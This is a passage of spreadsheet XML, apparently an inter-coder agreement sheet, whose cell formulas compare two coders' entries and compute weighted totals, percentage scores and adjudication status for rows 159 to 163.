        <f>IF(AND(Coder1!Y159&amp;""&lt;&gt;"",Coder1!Y159&amp;""=Coder2!Y159&amp;""),Coder1!Y159,"")</f>
        <v/>
      </c>
      <c r="Z159" s="14">
        <f>IF(AND(Coder1!Z159&amp;""&lt;&gt;"",Coder1!Z159&amp;""=Coder2!Z159&amp;""),Coder1!Z159,"")</f>
        <v/>
      </c>
      <c r="AA159" s="14">
        <f>IF(AND(Coder1!AA159&amp;""&lt;&gt;"",Coder1!AA159&amp;""=Coder2!AA159&amp;""),Coder1!AA159,"")</f>
        <v/>
      </c>
      <c r="AB159" s="14">
        <f>IF(AND(Coder1!AB159&amp;""&lt;&gt;"",Coder1!AB159&amp;""=Coder2!AB159&amp;""),Coder1!AB159,"")</f>
        <v/>
      </c>
      <c r="AC159" s="14">
        <f>IF(AND(Coder1!AC159&amp;""&lt;&gt;"",Coder1!AC159&amp;""=Coder2!AC159&amp;""),Coder1!AC159,"")</f>
        <v/>
      </c>
      <c r="AD159" s="14">
        <f>IF(AND(Coder1!AD159&amp;""&lt;&gt;"",Coder1!AD159&amp;""=Coder2!AD159&amp;""),Coder1!AD159,"")</f>
        <v/>
      </c>
      <c r="AE159" s="14">
        <f>IF(AND(Coder1!AE159&amp;""&lt;&gt;"",Coder1!AE159&amp;""=Coder2!AE159&amp;""),Coder1!AE159,"")</f>
        <v/>
      </c>
      <c r="AF159" s="14">
        <f>IF(AND(Coder1!AF159&amp;""&lt;&gt;"",Coder1!AF159&amp;""=Coder2!AF159&amp;""),Coder1!AF159,"")</f>
        <v/>
      </c>
      <c r="AG159" s="14">
        <f>IF(AND(Coder1!AG159&amp;""&lt;&gt;"",Coder1!AG159&amp;""=Coder2!AG159&amp;""),Coder1!AG159,"")</f>
        <v/>
      </c>
      <c r="AH159" s="14">
        <f>IF(AND(Coder1!AH159&amp;""&lt;&gt;"",Coder1!AH159&amp;""=Coder2!AH159&amp;""),Coder1!AH159,"")</f>
        <v/>
      </c>
      <c r="AI159" s="11">
        <f>IF(COUNT(E159:L159)=0,"",SUM(E159:L159))</f>
        <v/>
      </c>
      <c r="AJ159" s="11">
        <f>IF(AI159="","",N(E159)*3+N(F159)*2+N(G159)*2+N(H159)*2+N(I159)*2+N(J159)*3+N(K159)*3+N(L159)*3)</f>
        <v/>
      </c>
      <c r="AK159" s="11">
        <f>IF(AI159="","",COUNTIF(N159:AG159,1))</f>
        <v/>
      </c>
      <c r="AL159" s="11">
        <f>IF(OR(AJ159="",AJ159=0),"",ROUND(100*(AJ159-AK159)/AJ159,1))</f>
        <v/>
      </c>
      <c r="AM159" s="11">
        <f>IF(AND(Coder1!AN159=1,Coder2!AN159=1),IF(COUNTBLANK(E159:AH159)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN159" s="11">
        <f>IF(AND(Coder1!AN159=1,Coder2!AN159=1),IF(SUMPRODUCT(--(Coder1!E159:AH159&amp;""&lt;&gt;Coder2!E159:AH159&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO159" s="11" t="n"/>
    </row>
    <row r="160">
      <c r="A160" s="11">
        <f>Coder1!A160</f>
        <v/>
      </c>
      <c r="B160" s="11">
        <f>Coder1!B160</f>
        <v/>
      </c>
      <c r="C160" s="11">
        <f>Coder1!C160</f>
        <v/>
      </c>
      <c r="D160" s="11">
        <f>Coder1!D160</f>
        <v/>
      </c>
      <c r="E160" s="14">
        <f>IF(AND(Coder1!E160&amp;""&lt;&gt;"",Coder1!E160&amp;""=Coder2!E160&amp;""),Coder1!E160,"")</f>
        <v/>
      </c>
      <c r="F160" s="14">
        <f>IF(AND(Coder1!F160&amp;""&lt;&gt;"",Coder1!F160&amp;""=Coder2!F160&amp;""),Coder1!F160,"")</f>
        <v/>
      </c>
      <c r="G160" s="14">
        <f>IF(AND(Coder1!G160&amp;""&lt;&gt;"",Coder1!G160&amp;""=Coder2!G160&amp;""),Coder1!G160,"")</f>
        <v/>
      </c>
      <c r="H160" s="14">
        <f>IF(AND(Coder1!H160&amp;""&lt;&gt;"",Coder1!H160&amp;""=Coder2!H160&amp;""),Coder1!H160,"")</f>
        <v/>
      </c>
      <c r="I160" s="14">
        <f>IF(AND(Coder1!I160&amp;""&lt;&gt;"",Coder1!I160&amp;""=Coder2!I160&amp;""),Coder1!I160,"")</f>
        <v/>
      </c>
      <c r="J160" s="14">
        <f>IF(AND(Coder1!J160&amp;""&lt;&gt;"",Coder1!J160&amp;""=Coder2!J160&amp;""),Coder1!J160,"")</f>
        <v/>
      </c>
      <c r="K160" s="14">
        <f>IF(AND(Coder1!K160&amp;""&lt;&gt;"",Coder1!K160&amp;""=Coder2!K160&amp;""),Coder1!K160,"")</f>
        <v/>
      </c>
      <c r="L160" s="14">
        <f>IF(AND(Coder1!L160&amp;""&lt;&gt;"",Coder1!L160&amp;""=Coder2!L160&amp;""),Coder1!L160,"")</f>
        <v/>
      </c>
      <c r="M160" s="14">
        <f>IF(AND(Coder1!M160&amp;""&lt;&gt;"",Coder1!M160&amp;""=Coder2!M160&amp;""),Coder1!M160,"")</f>
        <v/>
      </c>
      <c r="N160" s="14">
        <f>IF(AND(Coder1!N160&amp;""&lt;&gt;"",Coder1!N160&amp;""=Coder2!N160&amp;""),Coder1!N160,"")</f>
        <v/>
      </c>
      <c r="O160" s="14">
        <f>IF(AND(Coder1!O160&amp;""&lt;&gt;"",Coder1!O160&amp;""=Coder2!O160&amp;""),Coder1!O160,"")</f>
        <v/>
      </c>
      <c r="P160" s="14">
        <f>IF(AND(Coder1!P160&amp;""&lt;&gt;"",Coder1!P160&amp;""=Coder2!P160&amp;""),Coder1!P160,"")</f>
        <v/>
      </c>
      <c r="Q160" s="14">
        <f>IF(AND(Coder1!Q160&amp;""&lt;&gt;"",Coder1!Q160&amp;""=Coder2!Q160&amp;""),Coder1!Q160,"")</f>
        <v/>
      </c>
      <c r="R160" s="14">
        <f>IF(AND(Coder1!R160&amp;""&lt;&gt;"",Coder1!R160&amp;""=Coder2!R160&amp;""),Coder1!R160,"")</f>
        <v/>
      </c>
      <c r="S160" s="14">
        <f>IF(AND(Coder1!S160&amp;""&lt;&gt;"",Coder1!S160&amp;""=Coder2!S160&amp;""),Coder1!S160,"")</f>
        <v/>
      </c>
      <c r="T160" s="14">
        <f>IF(AND(Coder1!T160&amp;""&lt;&gt;"",Coder1!T160&amp;""=Coder2!T160&amp;""),Coder1!T160,"")</f>
        <v/>
      </c>
      <c r="U160" s="14">
        <f>IF(AND(Coder1!U160&amp;""&lt;&gt;"",Coder1!U160&amp;""=Coder2!U160&amp;""),Coder1!U160,"")</f>
        <v/>
      </c>
      <c r="V160" s="14">
        <f>IF(AND(Coder1!V160&amp;""&lt;&gt;"",Coder1!V160&amp;""=Coder2!V160&amp;""),Coder1!V160,"")</f>
        <v/>
      </c>
      <c r="W160" s="14">
        <f>IF(AND(Coder1!W160&amp;""&lt;&gt;"",Coder1!W160&amp;""=Coder2!W160&amp;""),Coder1!W160,"")</f>
        <v/>
      </c>
      <c r="X160" s="14">
        <f>IF(AND(Coder1!X160&amp;""&lt;&gt;"",Coder1!X160&amp;""=Coder2!X160&amp;""),Coder1!X160,"")</f>
        <v/>
      </c>
      <c r="Y160" s="14">
        <f>IF(AND(Coder1!Y160&amp;""&lt;&gt;"",Coder1!Y160&amp;""=Coder2!Y160&amp;""),Coder1!Y160,"")</f>
        <v/>
      </c>
      <c r="Z160" s="14">
        <f>IF(AND(Coder1!Z160&amp;""&lt;&gt;"",Coder1!Z160&amp;""=Coder2!Z160&amp;""),Coder1!Z160,"")</f>
        <v/>
      </c>
      <c r="AA160" s="14">
        <f>IF(AND(Coder1!AA160&amp;""&lt;&gt;"",Coder1!AA160&amp;""=Coder2!AA160&amp;""),Coder1!AA160,"")</f>
        <v/>
      </c>
      <c r="AB160" s="14">
        <f>IF(AND(Coder1!AB160&amp;""&lt;&gt;"",Coder1!AB160&amp;""=Coder2!AB160&amp;""),Coder1!AB160,"")</f>
        <v/>
      </c>
      <c r="AC160" s="14">
        <f>IF(AND(Coder1!AC160&amp;""&lt;&gt;"",Coder1!AC160&amp;""=Coder2!AC160&amp;""),Coder1!AC160,"")</f>
        <v/>
      </c>
      <c r="AD160" s="14">
        <f>IF(AND(Coder1!AD160&amp;""&lt;&gt;"",Coder1!AD160&amp;""=Coder2!AD160&amp;""),Coder1!AD160,"")</f>
        <v/>
      </c>
      <c r="AE160" s="14">
        <f>IF(AND(Coder1!AE160&amp;""&lt;&gt;"",Coder1!AE160&amp;""=Coder2!AE160&amp;""),Coder1!AE160,"")</f>
        <v/>
      </c>
      <c r="AF160" s="14">
        <f>IF(AND(Coder1!AF160&amp;""&lt;&gt;"",Coder1!AF160&amp;""=Coder2!AF160&amp;""),Coder1!AF160,"")</f>
        <v/>
      </c>
      <c r="AG160" s="14">
        <f>IF(AND(Coder1!AG160&amp;""&lt;&gt;"",Coder1!AG160&amp;""=Coder2!AG160&amp;""),Coder1!AG160,"")</f>
        <v/>
      </c>
      <c r="AH160" s="14">
        <f>IF(AND(Coder1!AH160&amp;""&lt;&gt;"",Coder1!AH160&amp;""=Coder2!AH160&amp;""),Coder1!AH160,"")</f>
        <v/>
      </c>
      <c r="AI160" s="11">
        <f>IF(COUNT(E160:L160)=0,"",SUM(E160:L160))</f>
        <v/>
      </c>
      <c r="AJ160" s="11">
        <f>IF(AI160="","",N(E160)*3+N(F160)*2+N(G160)*2+N(H160)*2+N(I160)*2+N(J160)*3+N(K160)*3+N(L160)*3)</f>
        <v/>
      </c>
      <c r="AK160" s="11">
        <f>IF(AI160="","",COUNTIF(N160:AG160,1))</f>
        <v/>
      </c>
      <c r="AL160" s="11">
        <f>IF(OR(AJ160="",AJ160=0),"",ROUND(100*(AJ160-AK160)/AJ160,1))</f>
        <v/>
      </c>
      <c r="AM160" s="11">
        <f>IF(AND(Coder1!AN160=1,Coder2!AN160=1),IF(COUNTBLANK(E160:AH160)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN160" s="11">
        <f>IF(AND(Coder1!AN160=1,Coder2!AN160=1),IF(SUMPRODUCT(--(Coder1!E160:AH160&amp;""&lt;&gt;Coder2!E160:AH160&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO160" s="11" t="n"/>
    </row>
    <row r="161">
      <c r="A161" s="11">
        <f>Coder1!A161</f>
        <v/>
      </c>
      <c r="B161" s="11">
        <f>Coder1!B161</f>
        <v/>
      </c>
      <c r="C161" s="11">
        <f>Coder1!C161</f>
        <v/>
      </c>
      <c r="D161" s="11">
        <f>Coder1!D161</f>
        <v/>
      </c>
      <c r="E161" s="14">
        <f>IF(AND(Coder1!E161&amp;""&lt;&gt;"",Coder1!E161&amp;""=Coder2!E161&amp;""),Coder1!E161,"")</f>
        <v/>
      </c>
      <c r="F161" s="14">
        <f>IF(AND(Coder1!F161&amp;""&lt;&gt;"",Coder1!F161&amp;""=Coder2!F161&amp;""),Coder1!F161,"")</f>
        <v/>
      </c>
      <c r="G161" s="14">
        <f>IF(AND(Coder1!G161&amp;""&lt;&gt;"",Coder1!G161&amp;""=Coder2!G161&amp;""),Coder1!G161,"")</f>
        <v/>
      </c>
      <c r="H161" s="14">
        <f>IF(AND(Coder1!H161&amp;""&lt;&gt;"",Coder1!H161&amp;""=Coder2!H161&amp;""),Coder1!H161,"")</f>
        <v/>
      </c>
      <c r="I161" s="14">
        <f>IF(AND(Coder1!I161&amp;""&lt;&gt;"",Coder1!I161&amp;""=Coder2!I161&amp;""),Coder1!I161,"")</f>
        <v/>
      </c>
      <c r="J161" s="14">
        <f>IF(AND(Coder1!J161&amp;""&lt;&gt;"",Coder1!J161&amp;""=Coder2!J161&amp;""),Coder1!J161,"")</f>
        <v/>
      </c>
      <c r="K161" s="14">
        <f>IF(AND(Coder1!K161&amp;""&lt;&gt;"",Coder1!K161&amp;""=Coder2!K161&amp;""),Coder1!K161,"")</f>
        <v/>
      </c>
      <c r="L161" s="14">
        <f>IF(AND(Coder1!L161&amp;""&lt;&gt;"",Coder1!L161&amp;""=Coder2!L161&amp;""),Coder1!L161,"")</f>
        <v/>
      </c>
      <c r="M161" s="14">
        <f>IF(AND(Coder1!M161&amp;""&lt;&gt;"",Coder1!M161&amp;""=Coder2!M161&amp;""),Coder1!M161,"")</f>
        <v/>
      </c>
      <c r="N161" s="14">
        <f>IF(AND(Coder1!N161&amp;""&lt;&gt;"",Coder1!N161&amp;""=Coder2!N161&amp;""),Coder1!N161,"")</f>
        <v/>
      </c>
      <c r="O161" s="14">
        <f>IF(AND(Coder1!O161&amp;""&lt;&gt;"",Coder1!O161&amp;""=Coder2!O161&amp;""),Coder1!O161,"")</f>
        <v/>
      </c>
      <c r="P161" s="14">
        <f>IF(AND(Coder1!P161&amp;""&lt;&gt;"",Coder1!P161&amp;""=Coder2!P161&amp;""),Coder1!P161,"")</f>
        <v/>
      </c>
      <c r="Q161" s="14">
        <f>IF(AND(Coder1!Q161&amp;""&lt;&gt;"",Coder1!Q161&amp;""=Coder2!Q161&amp;""),Coder1!Q161,"")</f>
        <v/>
      </c>
      <c r="R161" s="14">
        <f>IF(AND(Coder1!R161&amp;""&lt;&gt;"",Coder1!R161&amp;""=Coder2!R161&amp;""),Coder1!R161,"")</f>
        <v/>
      </c>
      <c r="S161" s="14">
        <f>IF(AND(Coder1!S161&amp;""&lt;&gt;"",Coder1!S161&amp;""=Coder2!S161&amp;""),Coder1!S161,"")</f>
        <v/>
      </c>
      <c r="T161" s="14">
        <f>IF(AND(Coder1!T161&amp;""&lt;&gt;"",Coder1!T161&amp;""=Coder2!T161&amp;""),Coder1!T161,"")</f>
        <v/>
      </c>
      <c r="U161" s="14">
        <f>IF(AND(Coder1!U161&amp;""&lt;&gt;"",Coder1!U161&amp;""=Coder2!U161&amp;""),Coder1!U161,"")</f>
        <v/>
      </c>
      <c r="V161" s="14">
        <f>IF(AND(Coder1!V161&amp;""&lt;&gt;"",Coder1!V161&amp;""=Coder2!V161&amp;""),Coder1!V161,"")</f>
        <v/>
      </c>
      <c r="W161" s="14">
        <f>IF(AND(Coder1!W161&amp;""&lt;&gt;"",Coder1!W161&amp;""=Coder2!W161&amp;""),Coder1!W161,"")</f>
        <v/>
      </c>
      <c r="X161" s="14">
        <f>IF(AND(Coder1!X161&amp;""&lt;&gt;"",Coder1!X161&amp;""=Coder2!X161&amp;""),Coder1!X161,"")</f>
        <v/>
      </c>
      <c r="Y161" s="14">
        <f>IF(AND(Coder1!Y161&amp;""&lt;&gt;"",Coder1!Y161&amp;""=Coder2!Y161&amp;""),Coder1!Y161,"")</f>
        <v/>
      </c>
      <c r="Z161" s="14">
        <f>IF(AND(Coder1!Z161&amp;""&lt;&gt;"",Coder1!Z161&amp;""=Coder2!Z161&amp;""),Coder1!Z161,"")</f>
        <v/>
      </c>
      <c r="AA161" s="14">
        <f>IF(AND(Coder1!AA161&amp;""&lt;&gt;"",Coder1!AA161&amp;""=Coder2!AA161&amp;""),Coder1!AA161,"")</f>
        <v/>
      </c>
      <c r="AB161" s="14">
        <f>IF(AND(Coder1!AB161&amp;""&lt;&gt;"",Coder1!AB161&amp;""=Coder2!AB161&amp;""),Coder1!AB161,"")</f>
        <v/>
      </c>
      <c r="AC161" s="14">
        <f>IF(AND(Coder1!AC161&amp;""&lt;&gt;"",Coder1!AC161&amp;""=Coder2!AC161&amp;""),Coder1!AC161,"")</f>
        <v/>
      </c>
      <c r="AD161" s="14">
        <f>IF(AND(Coder1!AD161&amp;""&lt;&gt;"",Coder1!AD161&amp;""=Coder2!AD161&amp;""),Coder1!AD161,"")</f>
        <v/>
      </c>
      <c r="AE161" s="14">
        <f>IF(AND(Coder1!AE161&amp;""&lt;&gt;"",Coder1!AE161&amp;""=Coder2!AE161&amp;""),Coder1!AE161,"")</f>
        <v/>
      </c>
      <c r="AF161" s="14">
        <f>IF(AND(Coder1!AF161&amp;""&lt;&gt;"",Coder1!AF161&amp;""=Coder2!AF161&amp;""),Coder1!AF161,"")</f>
        <v/>
      </c>
      <c r="AG161" s="14">
        <f>IF(AND(Coder1!AG161&amp;""&lt;&gt;"",Coder1!AG161&amp;""=Coder2!AG161&amp;""),Coder1!AG161,"")</f>
        <v/>
      </c>
      <c r="AH161" s="14">
        <f>IF(AND(Coder1!AH161&amp;""&lt;&gt;"",Coder1!AH161&amp;""=Coder2!AH161&amp;""),Coder1!AH161,"")</f>
        <v/>
      </c>
      <c r="AI161" s="11">
        <f>IF(COUNT(E161:L161)=0,"",SUM(E161:L161))</f>
        <v/>
      </c>
      <c r="AJ161" s="11">
        <f>IF(AI161="","",N(E161)*3+N(F161)*2+N(G161)*2+N(H161)*2+N(I161)*2+N(J161)*3+N(K161)*3+N(L161)*3)</f>
        <v/>
      </c>
      <c r="AK161" s="11">
        <f>IF(AI161="","",COUNTIF(N161:AG161,1))</f>
        <v/>
      </c>
      <c r="AL161" s="11">
        <f>IF(OR(AJ161="",AJ161=0),"",ROUND(100*(AJ161-AK161)/AJ161,1))</f>
        <v/>
      </c>
      <c r="AM161" s="11">
        <f>IF(AND(Coder1!AN161=1,Coder2!AN161=1),IF(COUNTBLANK(E161:AH161)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN161" s="11">
        <f>IF(AND(Coder1!AN161=1,Coder2!AN161=1),IF(SUMPRODUCT(--(Coder1!E161:AH161&amp;""&lt;&gt;Coder2!E161:AH161&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO161" s="11" t="n"/>
    </row>
    <row r="162">
      <c r="A162" s="11">
        <f>Coder1!A162</f>
        <v/>
      </c>
      <c r="B162" s="11">
        <f>Coder1!B162</f>
        <v/>
      </c>
      <c r="C162" s="11">
        <f>Coder1!C162</f>
        <v/>
      </c>
      <c r="D162" s="11">
        <f>Coder1!D162</f>
        <v/>
      </c>
      <c r="E162" s="14">
        <f>IF(AND(Coder1!E162&amp;""&lt;&gt;"",Coder1!E162&amp;""=Coder2!E162&amp;""),Coder1!E162,"")</f>
        <v/>
      </c>
      <c r="F162" s="14">
        <f>IF(AND(Coder1!F162&amp;""&lt;&gt;"",Coder1!F162&amp;""=Coder2!F162&amp;""),Coder1!F162,"")</f>
        <v/>
      </c>
      <c r="G162" s="14">
        <f>IF(AND(Coder1!G162&amp;""&lt;&gt;"",Coder1!G162&amp;""=Coder2!G162&amp;""),Coder1!G162,"")</f>
        <v/>
      </c>
      <c r="H162" s="14">
        <f>IF(AND(Coder1!H162&amp;""&lt;&gt;"",Coder1!H162&amp;""=Coder2!H162&amp;""),Coder1!H162,"")</f>
        <v/>
      </c>
      <c r="I162" s="14">
        <f>IF(AND(Coder1!I162&amp;""&lt;&gt;"",Coder1!I162&amp;""=Coder2!I162&amp;""),Coder1!I162,"")</f>
        <v/>
      </c>
      <c r="J162" s="14">
        <f>IF(AND(Coder1!J162&amp;""&lt;&gt;"",Coder1!J162&amp;""=Coder2!J162&amp;""),Coder1!J162,"")</f>
        <v/>
      </c>
      <c r="K162" s="14">
        <f>IF(AND(Coder1!K162&amp;""&lt;&gt;"",Coder1!K162&amp;""=Coder2!K162&amp;""),Coder1!K162,"")</f>
        <v/>
      </c>
      <c r="L162" s="14">
        <f>IF(AND(Coder1!L162&amp;""&lt;&gt;"",Coder1!L162&amp;""=Coder2!L162&amp;""),Coder1!L162,"")</f>
        <v/>
      </c>
      <c r="M162" s="14">
        <f>IF(AND(Coder1!M162&amp;""&lt;&gt;"",Coder1!M162&amp;""=Coder2!M162&amp;""),Coder1!M162,"")</f>
        <v/>
      </c>
      <c r="N162" s="14">
        <f>IF(AND(Coder1!N162&amp;""&lt;&gt;"",Coder1!N162&amp;""=Coder2!N162&amp;""),Coder1!N162,"")</f>
        <v/>
      </c>
      <c r="O162" s="14">
        <f>IF(AND(Coder1!O162&amp;""&lt;&gt;"",Coder1!O162&amp;""=Coder2!O162&amp;""),Coder1!O162,"")</f>
        <v/>
      </c>
      <c r="P162" s="14">
        <f>IF(AND(Coder1!P162&amp;""&lt;&gt;"",Coder1!P162&amp;""=Coder2!P162&amp;""),Coder1!P162,"")</f>
        <v/>
      </c>
      <c r="Q162" s="14">
        <f>IF(AND(Coder1!Q162&amp;""&lt;&gt;"",Coder1!Q162&amp;""=Coder2!Q162&amp;""),Coder1!Q162,"")</f>
        <v/>
      </c>
      <c r="R162" s="14">
        <f>IF(AND(Coder1!R162&amp;""&lt;&gt;"",Coder1!R162&amp;""=Coder2!R162&amp;""),Coder1!R162,"")</f>
        <v/>
      </c>
      <c r="S162" s="14">
        <f>IF(AND(Coder1!S162&amp;""&lt;&gt;"",Coder1!S162&amp;""=Coder2!S162&amp;""),Coder1!S162,"")</f>
        <v/>
      </c>
      <c r="T162" s="14">
        <f>IF(AND(Coder1!T162&amp;""&lt;&gt;"",Coder1!T162&amp;""=Coder2!T162&amp;""),Coder1!T162,"")</f>
        <v/>
      </c>
      <c r="U162" s="14">
        <f>IF(AND(Coder1!U162&amp;""&lt;&gt;"",Coder1!U162&amp;""=Coder2!U162&amp;""),Coder1!U162,"")</f>
        <v/>
      </c>
      <c r="V162" s="14">
        <f>IF(AND(Coder1!V162&amp;""&lt;&gt;"",Coder1!V162&amp;""=Coder2!V162&amp;""),Coder1!V162,"")</f>
        <v/>
      </c>
      <c r="W162" s="14">
        <f>IF(AND(Coder1!W162&amp;""&lt;&gt;"",Coder1!W162&amp;""=Coder2!W162&amp;""),Coder1!W162,"")</f>
        <v/>
      </c>
      <c r="X162" s="14">
        <f>IF(AND(Coder1!X162&amp;""&lt;&gt;"",Coder1!X162&amp;""=Coder2!X162&amp;""),Coder1!X162,"")</f>
        <v/>
      </c>
      <c r="Y162" s="14">
        <f>IF(AND(Coder1!Y162&amp;""&lt;&gt;"",Coder1!Y162&amp;""=Coder2!Y162&amp;""),Coder1!Y162,"")</f>
        <v/>
      </c>
      <c r="Z162" s="14">
        <f>IF(AND(Coder1!Z162&amp;""&lt;&gt;"",Coder1!Z162&amp;""=Coder2!Z162&amp;""),Coder1!Z162,"")</f>
        <v/>
      </c>
      <c r="AA162" s="14">
        <f>IF(AND(Coder1!AA162&amp;""&lt;&gt;"",Coder1!AA162&amp;""=Coder2!AA162&amp;""),Coder1!AA162,"")</f>
        <v/>
      </c>
      <c r="AB162" s="14">
        <f>IF(AND(Coder1!AB162&amp;""&lt;&gt;"",Coder1!AB162&amp;""=Coder2!AB162&amp;""),Coder1!AB162,"")</f>
        <v/>
      </c>
      <c r="AC162" s="14">
        <f>IF(AND(Coder1!AC162&amp;""&lt;&gt;"",Coder1!AC162&amp;""=Coder2!AC162&amp;""),Coder1!AC162,"")</f>
        <v/>
      </c>
      <c r="AD162" s="14">
        <f>IF(AND(Coder1!AD162&amp;""&lt;&gt;"",Coder1!AD162&amp;""=Coder2!AD162&amp;""),Coder1!AD162,"")</f>
        <v/>
      </c>
      <c r="AE162" s="14">
        <f>IF(AND(Coder1!AE162&amp;""&lt;&gt;"",Coder1!AE162&amp;""=Coder2!AE162&amp;""),Coder1!AE162,"")</f>
        <v/>
      </c>
      <c r="AF162" s="14">
        <f>IF(AND(Coder1!AF162&amp;""&lt;&gt;"",Coder1!AF162&amp;""=Coder2!AF162&amp;""),Coder1!AF162,"")</f>
        <v/>
      </c>
      <c r="AG162" s="14">
        <f>IF(AND(Coder1!AG162&amp;""&lt;&gt;"",Coder1!AG162&amp;""=Coder2!AG162&amp;""),Coder1!AG162,"")</f>
        <v/>
      </c>
      <c r="AH162" s="14">
        <f>IF(AND(Coder1!AH162&amp;""&lt;&gt;"",Coder1!AH162&amp;""=Coder2!AH162&amp;""),Coder1!AH162,"")</f>
        <v/>
      </c>
      <c r="AI162" s="11">
        <f>IF(COUNT(E162:L162)=0,"",SUM(E162:L162))</f>
        <v/>
      </c>
      <c r="AJ162" s="11">
        <f>IF(AI162="","",N(E162)*3+N(F162)*2+N(G162)*2+N(H162)*2+N(I162)*2+N(J162)*3+N(K162)*3+N(L162)*3)</f>
        <v/>
      </c>
      <c r="AK162" s="11">
        <f>IF(AI162="","",COUNTIF(N162:AG162,1))</f>
        <v/>
      </c>
      <c r="AL162" s="11">
        <f>IF(OR(AJ162="",AJ162=0),"",ROUND(100*(AJ162-AK162)/AJ162,1))</f>
        <v/>
      </c>
      <c r="AM162" s="11">
        <f>IF(AND(Coder1!AN162=1,Coder2!AN162=1),IF(COUNTBLANK(E162:AH162)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN162" s="11">
        <f>IF(AND(Coder1!AN162=1,Coder2!AN162=1),IF(SUMPRODUCT(--(Coder1!E162:AH162&amp;""&lt;&gt;Coder2!E162:AH162&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO162" s="11" t="n"/>
    </row>
    <row r="163">
      <c r="A163" s="11">
        <f>Coder1!A163</f>
        <v/>
      </c>
      <c r="B163" s="11">
        <f>Coder1!B163</f>
        <v/>
      </c>
      <c r="C163" s="11">
        <f>Coder1!C163</f>
        <v/>
      </c>
      <c r="D163" s="11">
        <f>Coder1!D163</f>
        <v/>
      </c>
      <c r="E163" s="14">
        <f>IF(AND(Coder1!E163&amp;""&lt;&gt;"",Coder1!E163&amp;""=Coder2!E163&amp;""),Coder1!E163,"")</f>
        <v/>
      </c>
      <c r="F163" s="14">
        <f>IF(AND(Coder1!F163&amp;""&lt;&gt;"",Coder1!F163&amp;""=Coder2!F163&amp;""),Coder1!F163,"")</f>
        <v/>
      </c>
      <c r="G163" s="14">
        <f>IF(AND(Coder1!G163&amp;""&lt;&gt;"",Coder1!G163&amp;""=Coder2!G163&amp;""),Coder1!G163,"")</f>
        <v/>
      </c>
      <c r="H163" s="14">
        <f>IF(AND(Coder1!H163&amp;""&lt;&gt;"",Coder1!H163&amp;""=Coder2!H163&amp;""),Coder1!H163,"")</f>
        <v/>
      </c>
      <c r="I163" s="14">
        <f>IF(AND(Coder1!I163&amp;""&lt;&gt;"",Coder1!I163&amp;""=Coder2!I163&amp;""),Coder1!I163,"")</f>
        <v/>
      </c>
      <c r="J163" s="14">
        <f>IF(AND(Coder1!J163&amp;""&lt;&gt;"",Coder1!J163&amp;""=Coder2!J163&amp;""),Coder1!J163,"")</f>
        <v/>
      </c>
      <c r="K163" s="14">
        <f>IF(AND(Coder1!K163&amp;""&lt;&gt;"",Coder1!K163&amp;""=Coder2!K163&amp;""),Coder1!K163,"")</f>
        <v/>
      </c>
      <c r="L163" s="14">
        <f>IF(AND(Coder1!L163&amp;""&lt;&gt;"",Coder1!L163&amp;""=Coder2!L163&amp;""),Coder1!L163,"")</f>
        <v/>
      </c>
      <c r="M163" s="14">
        <f>IF(AND(Coder1!M163&amp;""&lt;&gt;"",Coder1!M163&amp;""=Coder2!M163&amp;""),Coder1!M163,"")</f>
        <v/>
      </c>
      <c r="N163" s="14">
        <f>IF(AND(Coder1!N163&amp;""&lt;&gt;"",Coder1!N163&amp;""=Coder2!N163&amp;""),Coder1!N163,"")</f>
        <v/>
      </c>
      <c r="O163" s="14">
        <f>IF(AND(Coder1!O163&amp;""&lt;&gt;"",Coder1!O163&amp;""=Coder2!O163&amp;""),Coder1!O163,"")</f>
        <v/>
      </c>
      <c r="P163" s="14">
        <f>IF(AND(Coder1!P163&amp;""&lt;&gt;"",Coder1!P163&amp;""=Coder2!P163&amp;""),Coder1!P163,"")</f>
        <v/>
      </c>
      <c r="Q163" s="14">
        <f>IF(AND(Coder1!Q163&amp;""&lt;&gt;"",Coder1!Q163&amp;""=Coder2!Q163&amp;""),Coder1!Q163,"")</f>
        <v/>
      </c>
      <c r="R163" s="14">
        <f>IF(AND(Coder1!R163&amp;""&lt;&gt;"",Coder1!R163&amp;""=Coder2!R163&amp;""),Coder1!R163,"")</f>
        <v/>
      </c>
      <c r="S163" s="14">
        <f>IF(AND(Coder1!S163&amp;""&lt;&gt;"",Coder1!S163&amp;""=Coder2!S163&amp;""),Coder1!S163,"")</f>
        <v/>
      </c>
      <c r="T163" s="14">
        <f>IF(AND(Coder1!T163&amp;""&lt;&gt;"",Coder1!T163&amp;""=Coder2!T163&amp;""),Coder1!T163,"")</f>
        <v/>
      </c>
      <c r="U163" s="14">
        <f>IF(AND(Coder1!U163&amp;""&lt;&gt;"",Coder1!U163&amp;""=Coder2!U163&amp;""),Coder1!U163,"")</f>
        <v/>
      </c>
      <c r="V163" s="14">
        <f>IF(AND(Coder1!V163&amp;""&lt;&gt;"",Coder1!V163&amp;""=Coder2!V163&amp;""),Coder1!V163,"")</f>
        <v/>
      </c>
      <c r="W163" s="14">
        <f>IF(AND(Coder1!W163&amp;""&lt;&gt;"",Coder1!W163&amp;""=Coder2!W163&amp;""),Coder1!W163,"")</f>
        <v/>
      </c>
      <c r="X163" s="14">
        <f>IF(AND(Coder1!X163&amp;""&lt;&gt;"",Coder1!X163&amp;""=Coder2!X163&amp;""),Coder1!X163,"")</f>
        <v/>
      </c>
      <c r="Y163" s="14">
        <f>IF(AND(Coder1!Y163&amp;""&lt;&gt;"",Coder1!Y163&amp;""=Coder2!Y163&amp;""),Coder1!Y163,"")</f>
        <v/>
      </c>
      <c r="Z163" s="14">
        <f>IF(AND(Coder1!Z163&amp;""&lt;&gt;"",Coder1!Z163&amp;""=Coder2!Z163&amp;""),Coder1!Z163,"")</f>
        <v/>
      </c>
      <c r="AA163" s="14">
        <f>IF(AND(Coder1!AA163&amp;""&lt;&gt;"",Coder1!AA163&amp;""=Coder2!AA163&amp;""),Coder1!AA163,"")</f>
        <v/>
      </c>
      <c r="AB163" s="14">
